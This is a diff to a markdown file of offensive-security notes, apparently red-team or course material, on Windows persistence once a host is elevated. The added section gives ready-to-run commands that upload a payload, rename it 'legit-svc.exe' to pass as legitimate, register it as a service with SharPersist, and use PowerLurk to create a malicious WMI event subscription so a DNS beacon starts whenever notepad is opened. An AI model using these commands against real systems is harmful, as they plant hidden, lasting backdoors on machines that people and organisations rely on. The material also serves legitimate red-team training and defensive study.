@@ -93,5 +93,30 @@ foreach ($Task in $Tasks)
 Review this list for possible exploitation parts by rechecking the HKCU and HKLM like above, and how often they are ran, lik at every user login or something of that nature
 
 ## Elevated Host persistence
+
 **Windows Services**
 
+Create a new service as an elevated system, this will only run when the system is rebooted
+```
+cd C:\Windows
+upload C:\Payloads\tcp-local_x64.svc.exe
+mv tcp-local_x64.svc.exe legit-svc.exe
+execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
+```
+
+**WMI Event Subscriptions**
+
+Can abuse one of these in WMI
+-EventConsumer
+-EventFilter
+-FilterToConsumerBinding
+
+Can use [PowerLurk](https://github.com/Sw4mpf0x/PowerLurk) to abuse these
+```
+cd C:\Windows
+upload C:\Payloads\dns_x64.exe
+powershell-import C:\Tools\PowerLurk.ps1
+powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
+```
+
+When notepad is opened the DNS beacon will connect
